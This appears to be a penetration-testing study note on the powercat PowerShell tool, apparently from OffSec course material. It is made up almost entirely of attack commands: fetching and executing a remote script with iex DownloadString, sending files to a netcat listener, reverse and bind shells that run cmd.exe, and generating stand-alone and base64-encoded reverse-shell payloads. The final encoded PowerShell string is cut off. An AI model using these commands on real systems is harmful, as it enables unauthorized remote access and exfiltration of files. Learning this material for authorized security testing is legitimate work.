[powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)
 

 ### running remote scripts using iex
```
 iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

 ```
 
 # Powercat File Transfers
 
 **listener on linux**
 ```
 sudo nc -lnvp 443 > receiving_powercat.ps1
 ```
**send on windows**

```
powercat -c IPADDRESS -p 443 -i C:\Users\Offsec\powercat.ps1
```
- `-c` option  specifies  client  mode sets the listening IP address, 
- `-p` specifies the port number to connect to
- `-i` indicates the local file that will be transferred remotely
- 
# Powercat Reverse Shells

**linux listener**
```
sudo nc -lvp 443
```
**windows send shell**
```
powercat -c IPADDRESS -p 443 -e cmd.exe
```

# Powercat Bind Shells
- `-l` option  to  create  a  listener
- `-p` to  specify  the  listening  port  number
- `-e` to  have  an application (cmd.exe) executed once connected

```
powercat -l -p 443 -e cmd.exe
```

# Powercat Stand-Alone Payloads

```
powercat -c IPADDRESS -p 443 -e cmd.exe -g >reverseshell.ps1
```
**Base64 Encoded**
```
powercat -c IPADDRESS -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```
**which requires passing the full encoded string to the executable**
```
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQB... 
